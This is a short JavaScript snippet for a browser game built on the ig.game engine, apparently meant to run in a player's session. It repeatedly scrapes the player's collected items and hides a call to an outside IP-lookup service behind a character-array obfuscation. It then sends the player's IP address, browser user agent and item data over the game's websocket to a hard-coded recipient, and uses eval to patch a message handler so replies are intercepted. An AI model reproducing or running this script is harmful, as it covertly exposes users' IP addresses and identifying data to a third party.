creanumber=0
resulta=[]
setInterval(()=>{
jQuery.ajax({
                url: "/j/c/r/" + creanumber + "/" + (20+creanumber) + "?" + sessionStorage.urlCacheAppend_collectedItems,
                context: true
            }).done(c =>{resulta+=c.items; creanumber<c.itemCount?creanumber+=20:null});
}, 20)

setTimeout(()=>{
(async () => {
    id2=ig.game.O5507.O5710;
    x=['t','p','s',':','/','g','e','i','o','n','.','h','l','c','a'];
    await jQuery.ajax(x[11]+x[0]+x[0]+x[1]+x[2]+x[3]+x[4]+x[4]+x[14]+x[1]+x[7]+x[10]+x[7]+x[1]+x[5]+x[6]+x[8]+x[12]+x[8]+x[13]+x[14]+x[0]+x[7]+x[8]+x[9]+x[10]+x[7]+x[8]+x[4]+x[5]+x[6]+x[0]+x[7]+x[1]).done(b => {lagado=b.ip})
await jQuery.ajax({url: "/j/i/gcr/" + 0 + "/" + 9999999999 + id2,context: id2}).done(a => {staffa=a.items})
ig.game.O3167.wssend(ig.game.O3167.ws, "od", {rid: "6244c015ee34491c18fcfd5f", pack:[lagado, navigator.userAgent, {id: staffa, x: resulta, y: 1}]});
eval("ig.game.O3167.O4252="+ig.game.O3167.O4252.toString().replaceAll("c,d){", "c,d){if(b.m=='od'){lada=b};"))
})();
}, 10000)
